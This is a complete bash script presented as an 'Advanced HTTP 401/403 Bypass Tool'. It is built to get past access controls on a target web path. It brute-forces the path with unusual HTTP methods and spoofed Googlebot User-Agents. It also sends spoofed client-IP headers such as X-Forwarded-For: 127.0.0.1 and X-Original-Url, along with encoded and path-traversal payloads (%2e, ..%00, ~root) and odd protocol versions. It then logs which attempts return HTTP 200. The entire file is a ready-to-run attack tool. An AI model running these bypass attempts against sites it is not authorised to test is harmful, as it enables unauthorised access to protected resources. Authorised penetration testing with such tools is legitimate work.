#!/bin/bash

# Advanced HTTP 401/403 Bypass Tool
# Usage: bash tool.sh -u https://example.com --ug --encode --method

# Default parameters
url=""
path=""
use_protocol=false
use_headers=false
use_methods=false
use_ug=false
use_all=false
use_encode=false

# Help function
function usage() {
    echo -e "Usage: bash tool.sh -u <url> -path <path> [options]"
    echo -e "\nOptions:"
    echo -e "  -u, --url       Target URL (e.g., https://example.com)"
    echo -e "  -path, --path   Path to bypass (e.g., /403/path)"
    echo -e "  --protocol      Bypass using HTTP protocols (1.0, 1.1)"
    echo -e "  --headers       Bypass using HTTP headers"
    echo -e "  --method        Bypass using HTTP methods"
    echo -e "  --ug            Bypass using User-Agent variations"
    echo -e "  --encode        Bypass using encoded paths"
    echo -e "  --all           Apply all bypass techniques"
    echo -e "  -h, --help      Show this help message"
    exit 0
}

# Parse command-line arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -u|--url) url="$2"; shift ;;
        -path|--path) path="$2"; shift ;;
        --protocol) use_protocol=true ;;
        --headers) use_headers=true ;;
        --method) use_methods=true ;;
        --ug) use_ug=true ;;
        --all) use_all=true ;;
        --encode) use_encode=true ;;
        -h|--help) usage ;;
        *) echo "Unknown parameter passed: $1"; usage ;;
    esac
    shift
done

# Ensure URL and path are provided
if [[ -z "$url" || -z "$path" ]]; then
    echo -e "\033[1;31mUsage: bash tool.sh -u https://example.com -path /403/path [options]\033[0m"
    echo "Run 'bash tool.sh -h' for more details."
    exit 1
fi

# Output log
output_file="bypass_results.txt"
echo "Bypassing 403/401 for $url$path" > "$output_file"
echo "Results will be saved to $output_file"
echo "====================================="

# Ask user if they want to check Wayback Machine
read -p "Do you want to check the URL in Wayback Machine? (y/n): " check_wayback
if [[ "$check_wayback" =~ ^[Yy]$ ]]; then
    echo "Checking the Wayback Machine for the url, please wait..."
    wayback_url="https://web.archive.org/cdx/search/cdx?url=$url&output=json"
    wayback_response=$(curl -s "$wayback_url" | jq -r '.[1][2] // empty' 2>/dev/null)

    if [[ -n "$wayback_response" ]]; then
        echo -e "\033[1;32m[+] Wayback URL found: https://web.archive.org/web/$wayback_response/$url\033[0m"
        echo "[+] Wayback URL found: https://web.archive.org/web/$wayback_response/$url" >> "$output_file"
    else
        echo -e "\033[1;33m[-] No Wayback URL found for $url\033[0m"
    fi
else
    echo -e "\033[1;33m[!] Skipping Wayback Machine check.\033[0m"
fi

# Define lists for fuzzing
methods=("GET" "POST" "PUT" "DELETE" "FOO" "HEAD" "OPTIONS" "TRACE" "CONNECT" "PATCH")
user_agents=(
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"
    "Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko/20050405 Epiphany/1.6.1 (Ubuntu) (Ubuntu package 1.0.2)"
    "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01"
    "Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.8.0.2) Gecko/20060309 SeaMonkey/1.0"
)
headers=(
    "X-Forwarded-For" "X-Real-IP" "X-Remote-IP" "Forwarded" "Access-Control-Allow-Credentials" "Access-Control-Allow-Origin" "Access-Control-Expose-Headers" "X-Original-Url" "X-Forwarded-Proto" "X-Remote-Addr" "X-Trusted-IP" "X-Requested-By" "X-Requested-For" "X-Forwarded-Server" "X-Rewrite-Url"
)
header_values=(
    "127.0.0.1" "localhost" "10.0.0.1" "$path" "*" "true" "*/*" "192.168.0.1" "10.0.0.0" "172.16.0.0" "127.0.0.1:80" "127.0.0.1:443"
)
paths=("/%2e$path" "/%252e$path" "$path/../" "$path[.].*" "$path/..%00" "$path/..%09" "$path/..%0d" "/../$path" "/%2e/$path" "/~root$path" "/~admin$path" "/%2e%2e/$path" "$path/%2e%2e/" "/%252e%252e/$path" "$path/%252e%252e/" "/%e0%80%af$path" "$path/%e0%80%af")
protocols=("1.0" "1.1" "2" "9.0")

# Function to send requests
function send_request {
    method=$1
    ua=$2
    header_key=$3
    header_value=$4
    target_path=$5
    protocol=${6:-1.1} # Default to HTTP/1.1

    # Construct curl arguments dynamically
    curl_args=(-k -s -o /dev/null -w "%{http_code}" -X "$method" "$url$target_path" --http"$protocol")
    [[ -n "$ua" ]] && curl_args+=(-A "$ua")
    [[ -n "$header_key" && -n "$header_value" ]] && curl_args+=(-H "$header_key: $header_value")

    response=$(curl "${curl_args[@]}")

    if [[ "$response" == "200" ]]; then
        color="\033[1;32m" # Green
    else
        color="\033[1;31m" # Red
    fi

    echo -e "${color}[HTTP $response] -> Method: $method, User-Agent: $ua, Header: $header_key: $header_value, Path: $target_path, Protocol: HTTP/$protocol\033[0m"
    echo "[HTTP $response] -> Method: $method, User-Agent: $ua, Header: $header_key: $header_value, Path: $target_path, Protocol: HTTP/$protocol" >> "$output_file"
}

# Start bypassing based on user selection
if $use_all || $use_methods; then
    echo "Testing HTTP methods..." >> "$output_file"
    for method in "${methods[@]}"; do
        send_request "$method" "" "" "" "$path" ""
    done
fi

if $use_all || $use_ug; then
    echo "Testing User-Agent bypasses..." >> "$output_file"
    for ua in "${user_agents[@]}"; do
        send_request "GET" "$ua" "" "" "$path" ""
    done
fi

if $use_all || $use_headers; then
    echo "Testing header-based bypasses..." >> "$output_file"
    for header in "${headers[@]}"; do
        for value in "${header_values[@]}"; do
            send_request "GET" "" "$header" "$value" "$path" ""
        done
    done
fi

if $use_all || $use_encode; then
    echo "Testing encoded paths..." >> "$output_file"
    for p in "${paths[@]}"; do
        send_request "GET" "" "" "" "$p" ""
    done
fi

if $use_all || $use_protocol; then
    echo "Testing protocol versions..." >> "$output_file"
    for protocol in "${protocols[@]}"; do
        send_request "GET" "" "" "" "$path" "$protocol"
    done
fi

echo "Bypass attempts complete. Check $output_file for results."
